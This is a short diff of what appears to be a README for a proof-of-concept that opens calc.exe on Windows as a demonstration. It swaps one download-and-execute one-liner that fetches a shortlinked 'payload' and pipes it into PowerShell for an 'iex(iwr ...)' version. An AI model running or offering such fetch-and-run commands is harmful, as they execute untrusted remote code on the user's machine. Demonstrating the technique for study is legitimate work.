@@ -22,7 +22,7 @@ This example depicts a demo "calc.exe" open as a demonstration for Windows users
 (``tinyurl.com/payload`` "points" to ``https://raw.githubusercontent.com/SoftPankek/yubidied/refs/heads/main/verylongthingthatwontfitin38chars``)
 
 ```bat
-curl -L tinyurl.com/payload | pwsh
+pwsh -c "iex(iwr tinyurl.com/payload)"
 ```
 
 ## DISCLAIMER
